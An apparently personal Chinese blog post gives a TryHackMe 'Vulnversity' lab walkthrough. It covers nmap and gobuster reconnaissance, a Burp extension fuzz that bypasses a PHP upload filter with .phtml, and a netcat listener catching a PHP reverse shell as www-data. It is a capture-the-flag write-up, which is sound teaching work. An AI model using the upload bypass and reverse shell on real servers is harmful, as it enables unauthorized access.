@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>TryHackMe -- Vulnversity - V4ler1an</title><meta name="Description" content="THM学习训练记录"><meta property="og:title" content="TryHackMe -- Vulnversity" />
+<meta property="og:description" content="THM学习训练记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/thm-vulnversity/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/thm-vulnversity/thm.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-02T07:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-02T08:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/thm-vulnversity/thm.jpeg" /><meta name="twitter:title" content="TryHackMe -- Vulnversity"/>
+<meta name="twitter:description" content="THM学习训练记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/thm-vulnversity/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/thm-vulnerability_capstone/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe -- Vulnversity",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-vulnversity\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-vulnversity\/thm.jpeg",
+                            "width":  1300 ,
+                            "height":  620 
+                        }],"genre": "posts","keywords": "THM","wordcount":  1870 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-vulnversity\/","datePublished": "2024-01-02T07:57:40+08:00","dateModified": "2024-01-02T08:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "THM学习训练记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/thm-vulnversity/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/thm-vulnversity/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">TryHackMe -- Vulnversity</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-02">2024-01-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1870 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id="/2024/01/thm-vulnversity/" class="leancloud_visitors" data-flag-title="TryHackMe -- Vulnversity">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/thm-vulnversity/thm.jpeg"
+        data-srcset="/2024/01/thm-vulnversity/thm.jpeg, /2024/01/thm-vulnversity/thm.jpeg 1.5x, /2024/01/thm-vulnversity/thm.jpeg 2x"
+        data-sizes="auto"
+        alt="/2024/01/thm-vulnversity/thm.jpeg"
+        title="THM学习训练记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-the-box-how-many-ports-are-open">Scan the box; how many ports are open?</a></li>
+        <li><a href="#what-version-of-the-squid-proxy-is-running-on-the-machine">What version of the squid proxy is running on the machine?</a></li>
+        <li><a href="#how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">How many ports will Nmap scan if the flag <strong>-p-400</strong> was used?</a></li>
+        <li><a href="#what-is-the-most-likely-operating-system-this-machine-is-running">What is the most likely operating system this machine is running?</a></li>
+        <li><a href="#what-port-is-the-web-server-running-on">What port is the web server running on?</a></li>
+        <li><a href="#what-is-the-flag-for-enabling-verbose-mode-using-nmap">What is the flag for enabling verbose mode using Nmap?</a></li>
+      </ul>
+    </li>
+    <li><a href="#locating-directories-using-gobuster">Locating directories using Gobuster</a>
+      <ul>
+        <li><a href="#what-is-the-directory-that-has-an-upload-form-page">What is the directory that has an upload form page?</a></li>
+      </ul>
+    </li>
+    <li><a href="#compromise-the-webserver">Compromise the Webserver</a>
+      <ul>
+        <li><a href="#what-common-file-type-youd-want-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out">What common file type you&rsquo;d want to upload to exploit the server is blocked? Try a couple to find out.</a></li>
+        <li><a href="#run-this-attack-what-extension-is-allowed">Run this attack, what extension is allowed?</a></li>
+        <li><a href="#what-is-the-name-of-the-user-who-manages-the-webserver">What is the name of the user who manages the webserver?</a></li>
+        <li><a href="#what-is-the-user-flag">What is the user flag?</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="thm---vulnversity">THM - Vulnversity</h1>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-the-box-how-many-ports-are-open">Scan the box; how many ports are open?</h3>
+<p>nmap扫描，同时扫一下服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -sV 10.10.189.32
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-05 20:51 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.189.32<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.35s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">994</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3128/tcp open  http-proxy  Squid http proxy 3.5.12
+</span></span><span class="line"><span class="cl">3333/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: VULNUNIVERSITY<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 33.45 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine">What version of the squid proxy is running on the machine?</h3>
+<p>squid proxy的版本，使用<code>-sV</code>参数直接确定扫描的端口对应的服务，3.5.12。</p>
+<h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">How many ports will Nmap scan if the flag <strong>-p-400</strong> was used?</h3>
+<p>范围扫描端口，这里会扫描0-400的端口范围。</p>
+<h3 id="what-is-the-most-likely-operating-system-this-machine-is-running">What is the most likely operating system this machine is running?</h3>
+<p>具体发行版本根据22端口的ssh服务可以确定是ubuntu。</p>
+<h3 id="what-port-is-the-web-server-running-on">What port is the web server running on?</h3>
+<p>web服务，看运行的web组件-Apache就可以，端口为3333。</p>
+<h3 id="what-is-the-flag-for-enabling-verbose-mode-using-nmap">What is the flag for enabling verbose mode using Nmap?</h3>
+<p>查看nmap运行过程中的具体信息，使用<code>-v</code>或者<code>-vv</code>选项。</p>
+<h2 id="locating-directories-using-gobuster">Locating directories using Gobuster</h2>
+<h3 id="what-is-the-directory-that-has-an-upload-form-page">What is the directory that has an upload form page?</h3>
+<p>首先访问一下3333端口的web服务，没有发现任何的输入框和按钮，然后使用gobuster进行目录扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/tmp/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://10.10.189.32:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t <span class="nv">64</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.189.32:3333
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">64</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/images/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/js/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/fonts/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/internal             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/internal/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">7194</span> / <span class="m">87665</span> <span class="o">(</span>8.21%<span class="o">)</span>^C
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Keyboard interrupt detected, terminating.
+</span></span><span class="line"><span class="cl">Progress: <span class="m">7275</span> / <span class="m">87665</span> <span class="o">(</span>8.30%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/tmp/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://10.10.189.32:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t <span class="nv">64</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.189.32:3333/internal/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">64</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 330<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/internal/uploads/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.189.32:3333/internal/css/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">10838</span> / <span class="m">87665</span> <span class="o">(</span>12.36%<span class="o">)</span>^C
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Keyboard interrupt detected, terminating.
+</span></span><span class="line"><span class="cl">Progress: <span class="m">10856</span> / <span class="m">87665</span> <span class="o">(</span>12.38%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在internal目录下存在upload路径。</p>
+<h2 id="compromise-the-webserver">Compromise the Webserver</h2>
+<h3 id="what-common-file-type-youd-want-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out">What common file type you&rsquo;d want to upload to exploit the server is blocked? Try a couple to find out.</h3>
+<p>确认被禁止上传的文件类型，一般情况下是可运行的代码文件或者可执行文件，这里测试出来是php文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403060959346.png"
+        title="image-20240306095906609" /></p>
+<h3 id="run-this-attack-what-extension-is-allowed">Run this attack, what extension is allowed?</h3>
+<p>对可上传文件类型进行fuzz，使用burp，替换php后缀：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015767.png"
+        title="image-20240306101529735" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061015913.png"
+        title="image-20240306101510876" /></p>
+<p>这里我只改了php这三个字符，没有加前面的.号。在测试时发现，如果针对.php进行fuzz，fuzz过程中会把.转换为%2e，导致fuzz出错，就没有再去改。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061020865.png"
+        title="image-20240306102012814" /></p>
+<p>修改方法是在payloads里设置一下最下面的编码：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061018316.png"
+        title="image-20240306101809258" /></p>
+<p>去掉选项或者去掉.号。</p>
+<h3 id="what-is-the-name-of-the-user-who-manages-the-webserver">What is the name of the user who manages the webserver?</h3>
+<p>本地监听，访问反弹shell的php文件<code>http://[ip]:3333/internal/uploads/php_reverse_shell.phtml</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nc -lvvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.2.124.22<span class="o">]</span> from localhost <span class="o">[</span>10.10.189.32<span class="o">]</span> <span class="m">35864</span>
+</span></span><span class="line"><span class="cl">Linux vulnuniversity 4.4.0-142-generic <span class="c1">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 21:33:42 up <span class="m">57</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
